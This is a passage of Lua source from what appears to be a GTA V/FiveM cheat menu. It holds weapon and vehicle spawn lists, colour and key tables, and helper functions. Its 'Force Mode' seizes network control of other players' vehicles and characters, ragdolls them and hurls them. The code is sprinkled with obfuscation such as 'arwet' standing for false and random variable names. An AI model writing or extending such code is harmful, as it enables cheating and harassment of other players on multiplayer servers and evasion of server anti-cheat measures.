            {"WEAPON_RAYPISTOL", "Up-n-Atomizer"}
        }

        local smgweapons = {
            {"WEAPON_MICROSMG", "Micro SMG"},
            {"WEAPON_MINISMG", "Mini SMG"},
            {"WEAPON_SMG", "SMG"},
            {"WEAPON_SMG_MK2", "SMG Mk II"},
            {"WEAPON_ASSAULTSMG", "Assault SMG"},
            {"WEAPON_COMBATPDW", "Combat PDW"},
            {"WEAPON_GUSENBERG", "Gunsenberg"},
            {"WEAPON_MACHINEPISTOL", "Machine Pistol"},
            {"WEAPON_MG", "MG"},
            {"WEAPON_COMBATMG", "Combat MG"},
            {"WEAPON_COMBATMG_MK2", "Combat MG Mk II"},
            {"WEAPON_RAYCARBINE", "Unholy Hellbringer"}
        }

        local assaultweapons = {
            {"WEAPON_ASSAULTRIFLE", "Assault Rifle"},
            {"WEAPON_ASSAULTRIFLE_MK2", "Assault Rifle Mk II"},
            {"WEAPON_CARBINERIFLE", "Carbine Rifle"},
            {"WEAPON_CARBINERIFLE_MK2", "Carbine Rigle Mk II"},
            {"WEAPON_ADVANCEDRIFLE", "Advanced Rifle"},
            {"WEAPON_SPECIALCARBINE", "Special Carbine"},
            {"WEAPON_SPECIALCARBINE_MK2", "Special Carbine Mk II"},
            {"WEAPON_BULLPUPRIFLE", "Bullpup Rifle"},
            {"WEAPON_BULLPUPRIFLE_MK2", "Bullpup Rifle Mk II"},
            {"WEAPON_COMPACTRIFLE", "Compact Rifle"}
        }

        local shotgunweapons = {
            {"WEAPON_PUMPSHOTGUN", "Pump Shotgun"},
            {"WEAPON_PUMPSHOTGUN_MK2", "Pump Shotgun Mk II"},
            {"WEAPON_SWEEPERSHOTGUN", "Sweeper Shotgun"},
            {"WEAPON_SAWNOFFSHOTGUN", "Sawed-Off Shotgun"},
            {"WEAPON_BULLPUPSHOTGUN", "Bullpup Shotgun"},
            {"WEAPON_ASSAULTSHOTGUN", "Assault Shotgun"},
            {"WEAPON_MUSKET", "Musket"},
            {"WEAPON_HEAVYSHOTGUN", "Heavy Shotgun"},
            {"WEAPON_DBSHOTGUN", "Double Barrel Shotgun"}
        }

        local sniperweapons = {
            {"WEAPON_SNIPERRIFLE", "Sniper Rifle"},
            {"WEAPON_HEAVYSNIPER", "Heavy Sniper"},
            {"WEAPON_HEAVYSNIPER_MK2", "Heavy Sniper Mk II"},
            {"WEAPON_MARKSMANRIFLE", "Marksman Rifle"},
            {"WEAPON_MARKSMANRIFLE_MK2", "Marksman Rifle Mk II"}
        }

        local heavyweapons = {
            {"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},
            {"WEAPON_RPG", "RPG"},
            {"WEAPON_MINIGUN", "Minigun"},
            {"WEAPON_FIREWORK", "Firework Launcher"},
            {"WEAPON_RAILGUN", "Railgun"},
            {"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},
            {"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},
            {"WEAPON_RAYMINIGUN", "Widowmaker"}
        }

        local compacts = {
            "BLISTA",
            "BRIOSO",
            "DILETTANTE",
            "DILETTANTE2",
            "ISSI2",
            "ISSI3",
            "ISSI4",
            "ISSI5",
            "ISSI6",
            "PANTO",
            "PRAIRIE",
            "RHAPSODY"
        }

        local sedans = {
            "ASEA",
            "ASEA2",
            "ASTEROPE",
            "COG55",
            "COG552",
            "COGNOSCENTI",
            "COGNOSCENTI2",
            "EMPEROR",
            "EMPEROR2",
            "EMPEROR3",
            "FUGITIVE",
            "GLENDALE",
            "INGOT",
            "INTRUDER",
            "LIMO2",
            "PREMIER",
            "PRIMO",
            "PRIMO2",
            "REGINA",
            "ROMERO",
            "SCHAFTER2",
            "SCHAFTER5",
            "SCHAFTER6",
            "STAFFORD",
            "STANIER",
            "STRATUM",
            "STRETCH",
            "SUPERD",
            "SURGE",
            "TAILGATER",
            "WARRENER",
            "WASHINGTON"
        }

        local suvs = {
            "BALLER",
            "BALLER2",
            "BALLER3",
            "BALLER4",
            "BALLER5",
            "BALLER6",
            "BJXL",
            "CAVALCADE",
            "CAVALCADE2",
            "CONTENDER",
            "DUBSTA",
            "DUBSTA2",
            "FQ2",
            "GRANGER",
            "GRESLEY",
            "HABANERO",
            "HUNTLEY",
            "LANDSTALKER",
            "MESA",
            "MESA2",
            "PATRIOT",
            "PATRIOT2",
            "RADI",
            "ROCOTO",
            "SEMINOLE",
            "SERRANO",
            "TOROS",
            "XLS",
            "XLS2"
        }

        local coupes = {
            "COGCABRIO",
            "EXEMPLAR",
            "F620",
            "FELON",
            "FELON2",
            "JACKAL",
            "ORACLE",
            "ORACLE2",
            "SENTINEL",
            "SENTINEL2",
            "WINDSOR",
            "WINDSOR2",
            "ZION",
            "ZION2"
        }

        local muscle = {
            "BLADE",
            "BUCCANEER",
            "BUCCANEER2",
            "CHINO",
            "CHINO2",
            "CLIQUE",
            "COQUETTE3",
            "DEVIANT",
            "DOMINATOR",
            "DOMINATOR2",
            "DOMINATOR3",
            "DOMINATOR4",
            "DOMINATOR5",
            "DOMINATOR6",
            "DUKES",
            "DUKES2",
            "ELLIE",
            "FACTION",
            "FACTION2",
            "FACTION3",
            "GAUNTLET",
            "GAUNTLET2",
            "HERMES",
            "HOTKNIFE",
            "HUSTLER",
            "IMPALER",
            "IMPALER2",
            "IMPALER3",
            "IMPALER4",
            "IMPERATOR",
            "IMPERATOR2",
            "IMPERATOR3",
            "LURCHER",
            "MOONBEAM",
            "MOONBEAM2",
            "NIGHTSHADE",
            "PHOENIX",
            "PICADOR",
            "RATLOADER",
            "RATLOADER2",
            "RUINER",
            "RUINER2",
            "RUINER3",
            "SABREGT",
            "SABREGT2",
            "SLAMVAN",
            "SLAMVAN2",
            "SLAMVAN3",
            "SLAMVAN4",
            "SLAMVAN5",
            "SLAMVAN6",
            "STALION",
            "STALION2",
            "TAMPA",
            "TAMPA3",
            "TULIP",
            "VAMOS",
            "VIGERO",
            "VIRGO",
            "VIRGO2",
            "VIRGO3",
            "VOODOO",
            "VOODOO2",
            "YOSEMITE"
        }

        local sportsclassics = {
            "ARDENT",
            "BTYPE",
            "BTYPE2",
            "BTYPE3",
            "CASCO",
            "CHEBUREK",
            "CHEETAH2",
            "COQUETTE2",
            "DELUXO",
            "FAGALOA",
            "FELTZER3",
            "GT500",
            "INFERNUS2",
            "JB700",
            "JESTER3",
            "MAMBA",
            "MANANA",
            "MICHELLI",
            "MONROE",
            "PEYOTE",
            "PIGALLE",
            "RAPIDGT3",
            "RETINUE",
            "SAVESTRA",
            "STINGER",
            "STINGERGT",
            "STROMBERG",
            "SWINGER",
            "TORERO",
            "TORNADO",
            "TORNADO2",
            "TORNADO3",
            "TORNADO4",
            "TORNADO5",
            "TORNADO6",
            "TURISMO2",
            "VISERIS",
            "Z190",
            "ZTYPE"
        }

        local sports = {
            "ALPHA",
            "BANSHEE",
            "BESTIAGTS",
            "BLISTA2",
            "BLISTA3",
            "BUFFALO",
            "BUFFALO2",
            "BUFFALO3",
            "CARBONIZZARE",
            "COMET2",
            "COMET3",
            "COMET4",
            "COMET5",
            "COQUETTE",
            "ELEGY",
            "ELEGY2",
            "FELTZER2",
            "FLASHGT",
            "FUROREGT",
            "FUSILADE",
            "FUTO",
            "GB200",
            "HOTRING",
            "ITALIGTO",
            "JESTER",
            "JESTER2",
            "KHAMELION",
            "KURUMA",
            "KURUMA2",
            "LYNX",
            "MASSACRO",
            "MASSACRO2",
            "NEON",
            "NINEF",
            "NINEF2",
            "OMNIS",
            "PARIAH",
            "PENUMBRA",
            "RAIDEN",
            "RAPIDGT",
            "RAPIDGT2",
            "RAPTOR",
            "REVOLTER",
            "RUSTON",
            "SCHAFTER2",
            "SCHAFTER3",
            "SCHAFTER4",
            "SCHAFTER5",
            "SCHLAGEN",
            "SCHWARZER",
            "SENTINEL3",
            "SEVEN70",
            "SPECTER",
            "SPECTER2",
            "SULTAN",
            "SURANO",
            "TAMPA2",
            "TROPOS",
            "VERLIERER2",
            "ZR380",
            "ZR3802",
            "ZR3803"
        }

        local super = {
            "ADDER",
            "AUTARCH",
            "BANSHEE2",
            "BULLET",
            "CHEETAH",
            "CYCLONE",
            "DEVESTE",
            "ENTITYXF",
            "ENTITY2",
            "FMJ",
            "GP1",
            "INFERNUS",
            "ITALIGTB",
            "ITALIGTB2",
            "LE7B",
            "NERO",
            "NERO2",
            "OSIRIS",
            "PENETRATOR",
            "PFISTER811",
            "PROTOTIPO",
            "REAPER",
            "SC1",
            "SCRAMJET",
            "SHEAVA",
            "SULTANRS",
            "T20",
            "TAIPAN",
            "TEMPESTA",
            "TEZERACT",
            "TURISMOR",
            "TYRANT",
            "TYRUS",
            "VACCA",
            "VAGNER",
            "VIGILANTE",
            "VISIONE",
            "VOLTIC",
            "VOLTIC2",
            "XA21",
            "ZENTORNO"
        }

        local motorcycles = {
            "AKUMA",
            "AVARUS",
            "BAGGER",
            "BATI",
            "BATI2",
            "BF400",
            "CARBONRS",
            "CHIMERA",
            "CLIFFHANGER",
            "DAEMON",
            "DAEMON2",
            "DEFILER",
            "DEATHBIKE",
            "DEATHBIKE2",
            "DEATHBIKE3",
            "DIABLOUS",
            "DIABLOUS2",
            "DOUBLE",
            "ENDURO",
            "ESSKEY",
            "FAGGIO",
            "FAGGIO2",
            "FAGGIO3",
            "FCR",
            "FCR2",
            "GARGOYLE",
            "HAKUCHOU",
            "HAKUCHOU2",
            "HEXER",
            "INNOVATION",
            "LECTRO",
            "MANCHEZ",
            "NEMESIS",
            "NIGHTBLADE",
            "OPPRESSOR",
            "OPPRESSOR2",
            "PCJ",
            "RATBIKE",
            "RUFFIAN",
            "SANCHEZ",
            "SANCHEZ2",
            "SANCTUS",
            "SHOTARO",
            "SOVEREIGN",
            "THRUST",
            "VADER",
            "VINDICATOR",
            "VORTEX",
            "WOLFSBANE",
            "ZOMBIEA",
            "ZOMBIEB"
        }

        local offroad = {
            "BFINJECTION",
            "BIFTA",
            "BLAZER",
            "BLAZER2",
            "BLAZER3",
            "BLAZER4",
            "BLAZER5",
            "BODHI2",
            "BRAWLER",
            "BRUISER",
            "BRUISER2",
            "BRUISER3",
            "BRUTUS",
            "BRUTUS2",
            "BRUTUS3",
            "CARACARA",
            "DLOADER",
            "DUBSTA3",
            "DUNE",
            "DUNE2",
            "DUNE3",
            "DUNE4",
            "DUNE5",
            "FREECRAWLER",
            "INSURGENT",
            "INSURGENT2",
            "INSURGENT3",
            "KALAHARI",
            "KAMACHO",
            "MARSHALL",
            "MENACER",
            "MESA3",
            "MONSTER",
            "MONSTER3",
            "MONSTER4",
            "MONSTER5",
            "NIGHTSHARK",
            "RANCHERXL",
            "RANCHERXL2",
            "RCBANDITO",
            "REBEL",
            "REBEL2",
            "RIATA",
            "SANDKING",
            "SANDKING2",
            "TECHNICAL",
            "TECHNICAL2",
            "TECHNICAL3",
            "TROPHYTRUCK",
            "TROPHYTRUCK2"
        }

        local industrial = {
            "BULLDOZER",
            "CUTTER",
            "DUMP",
            "FLATBED",
            "GUARDIAN",
            "HANDLER",
            "MIXER",
            "MIXER2",
            "RUBBLE",
            "TIPTRUCK",
            "TIPTRUCK2"
        }

        local utility = {
            "AIRTUG",
            "CADDY",
            "CADDY2",
            "CADDY3",
            "DOCKTUG",
            "FORKLIFT",
            "TRACTOR2",
            "TRACTOR3",
            "MOWER",
            "RIPLEY",
            "SADLER",
            "SADLER2",
            "SCRAP",
            "TOWTRUCK",
            "TOWTRUCK2",
            "TRACTOR",
            "UTILLITRUCK",
            "UTILLITRUCK2",
            "UTILLITRUCK3",
            "ARMYTRAILER",
            "ARMYTRAILER2",
            "FREIGHTTRAILER",
            "ARMYTANKER",
            "TRAILERLARGE",
            "DOCKTRAILER",
            "TR3",
            "TR2",
            "TR4",
            "TRFLAT",
            "TRAILERS",
            "TRAILERS4",
            "TRAILERS2",
            "TRAILERS3",
            "TVTRAILER",
            "TRAILERLOGS",
            "TANKER",
            "TANKER2",
            "BALETRAILER",
            "GRAINTRAILER",
            "BOATTRAILER",
            "RAKETRAILER",
            "TRAILERSMALL"
        }

        local vans = {
            "BISON",
            "BISON2",
            "BISON3",
            "BOBCATXL",
            "BOXVILLE",
            "BOXVILLE2",
            "BOXVILLE3",
            "BOXVILLE4",
            "BOXVILLE5",
            "BURRITO",
            "BURRITO2",
            "BURRITO3",
            "BURRITO4",
            "BURRITO5",
            "CAMPER",
            "GBURRITO",
            "GBURRITO2",
            "JOURNEY",
            "MINIVAN",
            "MINIVAN2",
            "PARADISE",
            "PONY",
            "PONY2",
            "RUMPO",
            "RUMPO2",
            "RUMPO3",
            "SPEEDO",
            "SPEEDO2",
            "SPEEDO4",
            "SURFER",
            "SURFER2",
            "TACO",
            "YOUGA",
            "YOUGA2"
        }

        local cycles = {
            "BMX",
            "CRUISER",
            "FIXTER",
            "SCORCHER",
            "TRIBIKE",
            "TRIBIKE2",
            "TRIBIKE3"
        }

        local boats = {
            "DINGHY",
            "DINGHY2",
            "DINGHY3",
            "DINGHY4",
            "JETMAX",
            "MARQUIS",
            "PREDATOR",
            "SEASHARK",
            "SEASHARK2",
            "SEASHARK3",
            "SPEEDER",
            "SPEEDER2",
            "SQUALO",
            "SUBMERSIBLE",
            "SUBMERSIBLE2",
            "SUNTRAP",
            "TORO",
            "TORO2",
            "TROPIC",
            "TROPIC2",
            "TUG"
        }

        local helicopters = {
            "AKULA",
            "ANNIHILATOR",
            "BUZZARD",
            "BUZZARD2",
            "CARGOBOB",
            "CARGOBOB2",
            "CARGOBOB3",
            "CARGOBOB4",
            "FROGGER",
            "FROGGER2",
            "HAVOK",
            "HUNTER",
            "MAVERICK",
            "POLMAV",
            "SAVAGE",
            "SEASPARROW",
            "SKYLIFT",
            "SUPERVOLITO",
            "SUPERVOLITO2",
            "SWIFT",
            "SWIFT2",
            "VALKYRIE",
            "VALKYRIE2",
            "VOLATUS"
        }


        local planes = {
            "ALPHAZ1",
            "AVENGER",
            "AVENGER2",
            "BESRA",
            "BLIMP",
            "BLIMP2",
            "BLIMP3",
            "BOMBUSHKA",
            "CARGOPLANE",
            "CUBAN800",
            "DODO",
            "DUSTER",
            "HOWARD",
            "HYDRA",
            "JET",
            "LAZER",
            "LUXOR",
            "LUXOR2",
            "MAMMATUS",
            "MICROLIGHT",
            "MILJET",
            "MOGUL",
            "MOLOTOK",
            "NIMBUS",
            "NOKOTA",
            "PYRO",
            "ROGUE",
            "SEABREEZE",
            "SHAMAL",
            "STARLING",
            "STRIKEFORCE",
            "STUNT",
            "TITAN",
            "TULA",
            "VELUM",
            "VELUM2",
            "VESTRA",
            "VOLATOL"
        }

        local service = {
            "AIRBUS",
            "BRICKADE",
            "BUS",
            "COACH",
            "PBUS2",
            "RALLYTRUCK",
            "RENTALBUS",
            "TAXI",
            "TOURBUS",
            "TRASH",
            "TRASH2",
            "WASTELANDER",
            "AMBULANCE",
            "FBI",
            "FBI2",
            "FIRETRUK",
            "LGUARD",
            "PBUS",
            "POLICE",
            "POLICE2",
            "POLICE3",
            "POLICE4",
            "POLICEB",
            "POLICEOLD1",
            "POLICEOLD2",
            "POLICET",
            "POLMAV",
            "PRANGER",
            "PREDATOR",
            "RIOT",
            "RIOT2",
            "SHERIFF",
            "SHERIFF2",
            "APC",
            "BARRACKS",
            "BARRACKS2",
            "BARRACKS3",
            "BARRAGE",
            "CHERNOBOG",
            "CRUSADER",
            "HALFTRACK",
            "KHANJALI",
            "RHINO",
            "SCARAB",
            "SCARAB2",
            "SCARAB3",
            "THRUSTER",
            "TRAILERSMALL2"
        }

        local commercial = {
            "BENSON",
            "BIFF",
            "CERBERUS",
            "CERBERUS2",
            "CERBERUS3",
            "HAULER",
            "HAULER2",
            "MULE",
            "MULE2",
            "MULE3",
            "MULE4",
            "PACKER",
            "PHANTOM",
            "PHANTOM2",
            "PHANTOM3",
            "POUNDER",
            "POUNDER2",
            "STOCKADE",
            "STOCKADE3",
            "TERBYTE",
            "CABLECAR",
            "FREIGHT",
            "FREIGHTCAR",
            "FREIGHTCONT1",
            "FREIGHTCONT2",
            "FREIGHTGRAIN",
            "METROTRAIN",
            "TANKERCAR"
        }

        -- END VEHICLES LISTS
        -- VEHICLE MODS LIST (this is going to take a while...)
        local classicColors = {
            {"Black", 0},
            {"Carbon Black", 147},
            {"Graphite", 1},
            {"Anhracite Black", 11},
            {"Black Steel", 2},
            {"Dark Steel", 3},
            {"Silver", 4},
            {"Bluish Silver", 5},
            {"Rolled Steel", 6},
            {"Shadow Silver", 7},
            {"Stone Silver", 8},
            {"Midnight Silver", 9},
            {"Cast Iron Silver", 10},
            {"Red", 27},
            {"Torino Red", 28},
            {"Formula Red", 29},
            {"Lava Red", 150},
            {"Blaze Red", 30},
            {"Grace Red", 31},
            {"Garnet Red", 32},
            {"Sunset Red", 33},
            {"Cabernet Red", 34},
            {"Wine Red", 143},
            {"Candy Red", 35},
            {"Hot Pink", 135},
            {"Pfsiter Pink", 137},
            {"Salmon Pink", 136},
            {"Sunrise Orange", 36},
            {"Orange", 38},
            {"Bright Orange", 138},
            {"Gold", 99},
            {"Bronze", 90},
            {"Yellow", 88},
            {"Race Yellow", 89},
            {"Dew Yellow", 91},
            {"Dark Green", 49},
            {"Racing Green", 50},
            {"Sea Green", 51},
            {"Olive Green", 52},
            {"Bright Green", 53},
            {"Gasoline Green", 54},
            {"Lime Green", 92},
            {"Midnight Blue", 141},
            {"Galaxy Blue", 61},
            {"Dark Blue", 62},
            {"Saxon Blue", 63},
            {"Blue", 64},
            {"Mariner Blue", 65},
            {"Harbor Blue", 66},
            {" Blue", 67},
            {"Surf Blue", 68},
            {"Nautical Blue", 69},
            {"Racing Blue", 73},
            {"Ultra Blue", 70},
            {"Light Blue", 74},
            {"Chocolate Brown", 96},
            {"Bison Brown", 101},
            {"Creeen Brown", 95},
            {"Feltzer Brown", 94},
            {"Maple Brown", 97},
            {"Beechwood Brown", 103},
            {"Sienna Brown", 104},
            {"Saddle Brown", 98},
            {"Moss Brown", 100},
            {"Woodbeech Brown", 102},
            {"Straw Brown", 99},
            {"Sandy Brown", 105},
            {"Bleached Brown", 106},
            {"Schafter Purple", 71},
            {"Spinnaker Purple", 72},
            {"Midnight Purple", 142},
            {"Bright Purple", 145},
            {"Cream", 107},
            {"Ice White", 111},
            {"Frost White", 112}
        }

        local matteColors = {
            {"Black", 12},
            {"Gray", 13},
            {"Light Gray", 14},
            {"Ice White", 131},
            {"Blue", 83},
            {"Dark Blue", 82},
            {"Midnight Blue", 84},
            {"Midnight Purple", 149},
            {"Schafter Purple", 148},
            {"Red", 39},
            {"Dark Red", 40},
            {"Orange", 41},
            {"Yellow", 42},
            {"Lime Green", 55},
            {"Green", 128},
            {"Forest Green", 151},
            {"Foliage Green", 155},
            {"Olive Darb", 152},
            {"Dark Earth", 153},
            {"Desert Tan", 154}
        }

        local metalColors = {
            {"Brushed Steel", 117},
            {"Brushed Black Steel", 118},
            {"Brushed Aluminum", 119},
            {"Chrome", 120},
            {"Pure Gold", 158},
            {"Brushed Gold", 159}
        }


        local Keys = {
            ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
            ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
            ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
            ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
            ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
            ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
            ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
            ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
            ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
            ["MOUSE1"] = 24
        }

        local currentMenuX = 1
        local selectedMenuX = 1
        local currentMenuY = 1
        local selectedMenuY = 1
        local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 }
        local menuY = { 0.1, 0.025, 0.2, 0.3 , 0.400, 0.425 }

        vRP = Proxy.getInterface("vRP")


        local function ForceMod()
            ForceTog = not ForceTog

            if ForceTog then

                Citizen.CreateThread(function()
                    ShowInfo("Force Mode ~g~[ON] ~g~\n~s~Active Mode -Â» KEY ~y~[E] ")

                    local ForceKey = Keys["E"]
                    local Force = 0.5
                    local KeyPressed = arwet
                    local KeyTimer = 0
                    local KeyDelay = 15
                    local ForceEnabled = arwet
                    local StartPush = arwet

                    function forcetick()

                        if (KeyPressed) then
                            KeyTimer = KeyTimer + 1
                            if (KeyTimer >= KeyDelay) then
                                KeyTimer = 0
                                KeyPressed = arwet
                            end
                        end



                        if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
                            KeyPressed = true
                            ForceEnabled = true
                        end

                        if (StartPush) then

                            StartPush = arwet
                            local pid = PlayerPedId()
                            local CamRot = GetGameplayCamRot(2)

                            local force = 5

                            local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
                            local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
                            local Fz = force * (CamRot.x * 0.2)

                            local PlayerVeh = GetVehiclePedIsIn(pid, arwet)

                            for k in EnumerateVehicles() do
                                SetEntityInvincible(k, arwet)
                                if IsEntityOnScreen(k) and k ~= PlayerVeh then
                                    ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, arwet, true, true, true, true)
                                end
                            end

                            for k in EnumeratePeds() do
                                if IsEntityOnScreen(k) and k ~= pid then
                                    ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, arwet, true, true, true, true)
                                end
                            end

                        end


                        if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
                            KeyPressed = true
                            StartPush = true
                            ForceEnabled = arwet
                        end

                        if (ForceEnabled) then
                            local pid = PlayerPedId()
                            local PlayerVeh = GetVehiclePedIsIn(pid, arwet)

                            Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)

                            DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, arwet, true, 2, nname, nname, arwet)

                            for k in EnumerateVehicles() do
                                SetEntityInvincible(k, true)
                                if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                                    RequestControlOnce(k)
                                    FreezeEntityPosition(k, arwet)
                                    Oscillate(k, Markerloc, 0.5, 0.3)
                                end
                            end

                            for k in EnumeratePeds() do
                                if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                                    RequestControlOnce(k)
                                    SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                                    FreezeEntityPosition(k, arwet)
                                    Oscillate(k, Markerloc, 0.5, 0.3)
                                end
                            end

                        end

                    end

                    while ForceTog do forcetick()Wait(0) end
                end)
            else ShowInfo("Force Mode ~r~[OFF]") end

        end

        function GetSeatPedIsIn(ped)
            if not IsPedInAnyVehicle(ped, arwet) then return
            else
                veh = GetVehiclePedIsIn(ped)
                for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
                    if GetPedInVehicleSeat(veh) then return i end
                end
            end
        end

        function GetCamDirFromScreenCenter()
            local pos = GetGameplayCamCoord()
            local world = ScreenToWorld(0, 0)
            local ret = SubVectors(world, pos)
            return ret
        end

        local function RGBRainbow(frequency)
            local result = {}
            local curtime = GetGameTimer() / 1000

            result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
            result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
            result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

            return result
        end

        function ScreenToWorld(screenCoord)
            local camRot = GetGameplayCamRot(2)
            local camPos = GetGameplayCamCoord()

            local vect2x = 0.0
            local vect2y = 0.0
            local vect21y = 0.0
            local vect21x = 0.0
            local direction = RotationToDirection(camRot)
            local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
            local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
            local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)

            local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
            local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
            local radians = -(math.rad(camRot.y))

            vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
            vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))

            local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
            if not case1 then
                vect2x = x1
                vect2y = y1
                return camPos + (direction * 10.0)
            end
            
            local NOY = 1
            local nKGJjT = 1
            local PYFWQhTGNGfHR_keh8xib = "bus"
            local o = {"bus", "monster", "freight", "bulldozer"}
            local Wi1DeMQa = 1
            local f9uvgbrB = 1


            local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
            if not case2 then
                vect21x = x2
                vect21y = y2
                return camPos + (direction * 10.0)
            end

            if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
                return camPos + (direction * 10.0)
            end

            local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
            local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
            return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

        end

        function WorldToScreenRel(worldCoords)
            local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
            if not check then
                return arwet
            end

            screenCoordsx = (x - 0.5) * 2.0
            screenCoordsy = (y - 0.5) * 2.0
            return true, screenCoordsx, screenCoordsy
        end

        function RotationToDirection(rotation)
            local retz = math.rad(rotation.z)
            local retx = math.rad(rotation.x)
            local absx = math.abs(math.cos(retx))
            return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
        end

        local function GetCamDirection()
            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
            local pitch = GetGameplayCamRelativePitch()

            local x = -math.sin(heading * math.pi / 180.0)
            local y = math.cos(heading * math.pi / 180.0)
            local z = math.sin(pitch * math.pi / 180.0)

            local len = math.sqrt(x * x + y * y + z * z)
            if len ~= 0 then
                x = x / len
                y = y / len
                z = z / len
            end

            return x, y, z
        end

        function ApplyForce(entity, direction)
            ApplyForceToEntity(entity, 3, direction, 0, 0, 0, arwet, arwet, true, true, arwet, true)
        end

        function RequestControlOnce(entity)
            if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
                return true
            end
            SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
            return NetworkRequestControlOfEntity(entity)
        end

        function RequestControl(entity)
            Citizen.CreateThread(function()
                local tick = 0
                while not RequestControlOnce(entity) and tick <= 12 do
                    tick = tick + 1
                    Wait(0)
                end
                return tick <= 12
            end)
        end

        function Oscillate(entity, position, angleFreq, dampRatio)
            local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
            local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
            local targetPos = SubVectors(pos1, pos2)

            ApplyForce(entity, targetPos)
        end

        -- END MENYOO/ENTITY FUNCTIONS
        -- DRAWING FUNCTIONS
        function ShowMPMessage(message, subtitle, ms)
            Citizen.CreateThread(function()
                Citizen.Wait(0)
                function Initialize(scaleform)
                    local scaleform = RequestScaleformMovie(scaleform)
                    while not HasScaleformMovieLoaded(scaleform) do
                        Citizen.Wait(0)
                    end
                    PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
                    PushScaleformMovieFunctionParameterString(message)
                    PushScaleformMovieFunctionParameterString(subtitle)
                    PopScaleformMovieFunctionVoid()
                    Citizen.SetTimeout(6500, function()
                        PushScaleformMovieFunction(scaleform, "SHARD_ANIM_OUT")
                        PushScaleformMovieFunctionParameterInt(1)
                        PushScaleformMovieFunctionParameterFloat(0.33)
                        PopScaleformMovieFunctionVoid()
                        Citizen.SetTimeout(3000, function()EndScaleformMovieMethod() end)
                    end)
                    return scaleform
                end

                scaleform = Initialize("mp_big_message_freemode")

                while true do
                    Citizen.Wait(0)
                    DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 150, 0)
                end
            end)
        end

        function ShowInfo(text)
            SetNotificationTextEntry("STRING")
            AddTextComponentString(text)
            DrawNotification(true, arwet)
        end

        function DrawTxt(text, x, y, scale, size)
            SetTextFont(0)
            SetTextProportional(1)
            SetTextScale(scale, size)
            SetTextDropshadow(1, 0, 0, 0, 255)
            SetTextEdge(1, 0, 0, 0, 255)
            SetTextDropShadow()
            SetTextOutline()
            SetTextEntry("STRING")
            AddTextComponentString(text)
            DrawText(x, y)
        end

        function DrawText3D(x, y, z, text)
